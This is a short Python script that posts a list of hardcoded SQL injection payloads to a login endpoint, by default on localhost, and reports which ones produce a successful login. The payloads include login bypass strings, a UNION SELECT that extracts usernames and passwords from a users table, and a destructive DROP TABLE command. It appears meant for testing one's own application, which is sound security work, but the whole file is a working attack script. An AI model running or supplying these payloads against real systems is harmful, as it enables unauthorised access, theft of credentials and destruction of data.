import requests

# List of hardcoded SQL injection payloads
hardcoded_payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' UNION SELECT null, username, password FROM users --",
    "'; DROP TABLE users --",
    "' OR 'x'='x",
    "' AND 1=1 --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' AND 'a'='a",
    "';--"
]

# Function to test SQL injection with hardcoded payloads
def test_sql_injection(url):
    for payload in hardcoded_payloads:
        payload = payload.strip()  # Clean up any extra whitespace or newlines

        # Construct the payload JSON
        data = {
            "username": "admin",
            "password": payload
        }

        # Make the POST request
        response = requests.post(url, json=data)

        # Check for a successful login or invalid credentials
        if response.status_code == 200 and "Logged in!" in response.text:
            print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
        elif response.status_code == 401 and "Invalid credentials" in response.text:
            print(f"Failed with payload: {payload} (expected behavior)")
        else:
            print(f"Unexpected response with payload: {payload}, Status code: {response.status_code}")

# Set the URL of the vulnerable endpoint
url = "http://127.0.0.1:5000/login"  # Replace with your application's URL

# Test with hardcoded payloads
print("Testing with hardcoded payloads...")
test_sql_injection(url)
